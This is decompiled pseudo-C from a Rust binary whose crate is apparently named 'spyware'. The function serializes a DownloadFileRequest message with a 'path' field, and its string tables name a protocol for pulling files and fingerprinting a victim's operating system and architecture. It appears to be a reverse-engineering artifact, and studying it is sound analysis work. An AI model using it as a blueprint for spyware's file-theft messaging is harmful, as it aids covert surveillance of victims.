long long spyware::communication::messages::_::<impl serde::ser::Serialize for spyware::communication::messages::DownloadFileRequest>::serialize(struct_0 *a0, unsigned long long a1, unsigned long long a2)
{
    unsigned long long v0;  // [bp-0x50]
    char v1;  // [bp-0x48]
    char v2;  // [bp-0x40], Other Possible Types: unsigned int
    unsigned int v3;  // [bp-0x3c]
    unsigned long v4;  // [bp-0x38], Other Possible Types: unsigned long long
    char v5;  // [bp-0x30]
    char v6;  // [bp-0x2f]
    char v7;  // [bp-0x20]
    int v9;  // xmm0
    int v10;  // xmm1

    v2.serialize_struct(a2, "DownloadFileRequestDownloadFileResponsefile_dataGetBasicInfoRequestplaceholderOperatingSystemWindowsLinuxFreeBSDMacOSIOSAndroidUnknownArchitecturex86x86_64powerpcpowerpc64armaarch64PointerWidthBit32Bit64GetBasicInfoResponseversiontarget_osoperating_system_", 19, 1);
    if (v2 != 33)
    {
        *((int128_t *)&a0->field_11[15]) = *((int128_t *)&v7);
        *((int128_t *)&a0->field_11[0]) = *((int128_t *)&v6);
        *((unsigned int *)&a0->field_0) = v2;
        *((unsigned int *)&a0->padding_1[3]) = v3;
        *((unsigned long *)&a0->padding_1[7]) = v4;
        a0->field_10 = v5;
        return a0;
    }
    v0 = v4;
    v1 = v5;
    v2.serialize_field(&v0, "pathINFO-infNonelineshimmips    NOEXi128", 4, a1);
    if (v2 != 33)
    {
        v9 = *((int128_t *)&v2);
        v10 = *((int128_t *)&v5);
        *((int128_t *)&a0->field_11[15]) = *((int128_t *)&v7);
        *((void*)&a0->field_10) = v10;
        *((void*)&a0->field_0) = v9;
        return a0;
    }
    a0.end(v0, v1);
    return a0;
}
